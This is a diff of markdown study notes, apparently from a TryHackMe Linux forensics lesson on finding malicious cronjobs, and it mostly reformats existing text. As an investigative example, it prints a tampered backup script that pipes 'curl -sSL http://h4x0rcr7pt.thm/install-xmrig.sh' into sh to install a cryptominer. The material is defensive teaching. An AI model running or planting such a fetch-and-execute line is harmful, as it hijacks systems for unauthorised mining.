@@ -268,6 +268,8 @@ Use pstree to list out the process hierarchies. What is the name of the nc proce
 
 ## Cronjobs
 
+For thorough documentation on reading and creating Cron expressions, check out [Crontab Guru](https://crontab.guru/).  
+
 Cronjobs are scheduled tasks executed automatically at predefined intervals by the cron daemon.  
 The cron daemon is a background process responsible for managing cronjobs based on configuration files known as crontabs.  
 Users can have their crontab file stored in the `/var/spool/cron/crontabs` directory.  
@@ -281,71 +283,73 @@ Cron entries follow a specific format consisting of space-separated fields.
 
 #### Explanation
 
-**Minute (10)** : The first field specifies the minute when the command will be executed. In this case, it's 10, indicating that the command will be executed at the 10th minute of the hour.
-**Hour (05)** : The second field specifies the hour when the command will be executed. It's 05, indicating that the command will be executed at 5:10 AM.
-**Day of the Month (*)** : The third field specifies the day of the month when the command will be executed. In this case, it's *, a wildcard value, meaning it will be executed every day of the month. You can also specify a specific day of the month using numbers from 1 to 31. For example, to execute the command on the 15th day of every month, you would use 15.
-**Month (*)** : The fourth field specifies the month when the command will be executed. Here, it's also *, meaning the command will be executed monthly. You can specify months using either numbers (1 for January, 2 for February, etc.) or shorthand names (Jan for January, Feb for February, etc.). For example, you can use either 2 or Feb to execute the command only in February.
-**Day of the Week (*)** : The fifth field specifies the day of the week the command will be executed. In this case, it's *, which means the command will be executed every day of the week. You can also specify days of the week using numbers from 0 to 7, where 0 and 7 represent Sunday, 1 represents Monday, and so on. Alternatively, you can use the shorthand names (Sun, Mon, Tue, etc.). For example, you can use either 1 or Mon.
-**Command (/home/bob/backup_tmp.sh)** : The final field contains the command to be executed.
+**Minute (10)** : The first field specifies the minute when the command will be executed. In this case, it's 10, indicating that the command will be executed at the 10th minute of the hour.  
+**Hour (05)** : The second field specifies the hour when the command will be executed. It's 05, indicating that the command will be executed at 5:10 AM.  
+**Day of the Month (*)** : The third field specifies the day of the month when the command will be executed. In this case, it's *, a wildcard value, meaning it will be executed every day of the month. You can also specify a specific day of the month using numbers from 1 to 31. For example, to execute the command on the 15th day of every month, you would use 15.  
+**Month (*)** : The fourth field specifies the month when the command will be executed. Here, it's also *, meaning the command will be executed monthly. You can specify months using either numbers (1 for January, 2 for February, etc.) or shorthand names (Jan for January, Feb for February, etc.). For example, you can use either 2 or Feb to execute the command only in February.  
+**Day of the Week (*)** : The fifth field specifies the day of the week the command will be executed. In this case, it's *, which means the command will be executed every day of the week. You can also specify days of the week using numbers from 0 to 7, where 0 and 7 represent Sunday, 1 represents Monday, and so on. Alternatively, you can use the shorthand names (Sun, Mon, Tue, etc.). For example, you can use either 1 or Mon.  
+**Command (/home/bob/backup_tmp.sh)** : The final field contains the command to be executed.  
 
-Additionally, it's important to note that the system-level /etc/crontab differs from user-level crontabs. System-wide crontabs will include an additional field specifying the user under which the command will run (i.e., root or www-data).
+Additionally, it's important to note that the system-level `/etc/crontab` differs from user-level crontabs.  
+System-wide crontabs will include an additional field specifying the user under which the command will run (i.e., root or www-data).  
 
-Putting it all together, the cron schedule is configured to execute the command /home/bob/backup_tmp.sh at 5:10 AM every day.
+The cron schedule is configured to execute the command /home/bob/backup_tmp.sh at 5:10 AM every day.  
 
-For thorough documentation on reading and creating Cron expressions, check out Crontab Guru.
-
-Cronjobs, while essential for automating tasks, can also be a target for attackers seeking to establish persistence or escalate privileges on a system. Therefore, it's crucial for incident responders and forensic analysts to know how to analyse the system for any suspicious cronjobs or scheduled tasks.
+Cronjobs is a target for attackers seeking to establish persistence or escalate privileges on a system.  
+Crucial for incident responders and forensic analysts to know how to analyse the system for any suspicious cronjobs or scheduled tasks.  
 
 ### Cron Configuration Files
 
-We can begin our investigation into cronjobs on the system by first taking inventory of the system's cron configuration files. Fortunately, this process is relatively straightforward as these files are typically stored in known locations.
+We can begin our investigation into cronjobs on the system by first taking inventory of the system's cron configuration files.  
+Fortunately, this process is relatively straightforward as these files are typically stored in known locations.
 
-/etc/crontab
+#### Viewing /etc/crontab
 
-Firstly, let's focus on /etc/crontab, the main repository for system-wide cronjobs. Administrators can configure tasks that require elevated privileges within this file, often executing commands as the root user. To view this file, we can cat its contents:
-Viewing /etc/crontab
+`:> investigator@tryhackme:~$ cat /etc/crontab`  
 
-           
-investigator@tryhackme:~$ cat /etc/crontab
-...
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-...
-*/5 * * * * root /var/tmp/backup
+    ...
+    SHELL=/bin/sh
+    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+    ...
+    */5 * * * * root /var/tmp/backup
 
-        
+The above contents of /etc/crontab show the default shell and path variables used to execute commands.  
 
-The above contents of /etc/crontab show the default shell and path variables used to execute commands. Below that, we can see a single cronjob entry:
+Below that, we can see a single cronjob entry:
 
-*/5 * * * * root /var/tmp/backup
+    */5 * * * * root /var/tmp/backup
 
-By reading the syntax above, we can determine that the /var/tmp/backup file will execute every five minutes as root. The */5 is a way within cron's syntax to specify every fifth minute.
+By reading the syntax above, we can determine that the `/var/tmp/backup` file will execute every five minutes as root. The `*/5` is a way within cron's syntax to specify every fifth minute.  
 
-This finding invokes immediate suspicion as a system-level cronjob executes a command with root privileges in the /var/tmp directory. This is a world-writable directory, meaning that any user can modify or replace the backup file that is being executed. This could be a misconfiguration that an attacker abused to escalate privileges or a persistence method created by the attacker after gaining root access to the system.
+This finding invokes immediate suspicion as a system-level cronjob executes a command with root privileges in the /var/tmp directory.  
+This is a world-writable directory, meaning that any user can modify or replace the backup file that is being executed.  
+This could be a misconfiguration that an attacker abused to escalate privileges or a persistence method created by the attacker after gaining root access to the system.  
+When viewing the contents of this backup file, we can determine suspicious additions to the script:  
 
-When viewing the contents of this backup file, we can determine suspicious additions to the script:
-Viewing the Contents of /var/tmp/backup
+#### Viewing the Contents of /var/tmp/backup
 
-           
-investigator@tryhackme:~$ cat /var/tmp/backup
-#!/bin/bash
+`:> investigator@tryhackme:~$ cat /var/tmp/backup`  
 
-tar -czf web_backup.tar.gz /var/www/html && curl -sSL http://h4x0rcr7pt.thm/install-xmrig.sh | sh
+    #!/bin/bash
 
-        
+    tar -czf web_backup.tar.gz /var/www/html && curl -sSL http://h4x0rcr7pt.thm/install-xmrig.sh | sh
 
-Although the backup script initially appears to perform a legitimate backup operation, an additional command has been appended to download and execute an install script via curl. From the name of the script, it appears to be related to the XMRig cryptocurrency mining software and warrants further investigation. This example illustrates a common tactic attackers use to leverage compromised systems for unauthorised cryptocurrency mining.
+Although the backup script initially appears to perform a legitimate backup operation, an additional command has been appended to download and execute an install script via curl.  
+From the name of the script, it appears to be related to the XMRig cryptocurrency mining software and warrants further investigation.  
+This example illustrates a common tactic attackers use to leverage compromised systems for unauthorised cryptocurrency mining.  
 
-Next, additional system cronjob directories are important for a thorough analysis. These directories are found under the /etc/ directory with the following naming convention:
+Next, additional system cronjob directories are important for a thorough analysis.  
+These directories are found under the /etc/ directory with the following naming convention:
 
-    /etc/cron.hourly/ - System cronjobs that run once per hour.
-    /etc/cron.daily/ - System cronjobs that run once per day.
-    /etc/cron.weekly/ - System cronjobs that run once per week.
-    /etc/cron.monthly/ - System cronjobs that run once per month.
-    /etc/cron.d/ - Additional custom system cronjobs.
+    *  **/etc/cron.hourly/** - System cronjobs that run once per hour.
+    *  **/etc/cron.daily/** - System cronjobs that run once per day.
+    *  **/etc/cron.weekly/** - System cronjobs that run once per week.
+    *  **/etc/cron.monthly/** - System cronjobs that run once per month.
+    *  **/etc/cron.d/** - Additional custom system cronjobs.
 
 With these locations in mind, we can list out any configured cronjobs with the ls command:
-Listing Additional Cronjobs
+
+#### Listing Additional Cronjobs
 
            
 investigator@tryhackme:~$ ls /etc/cron.d
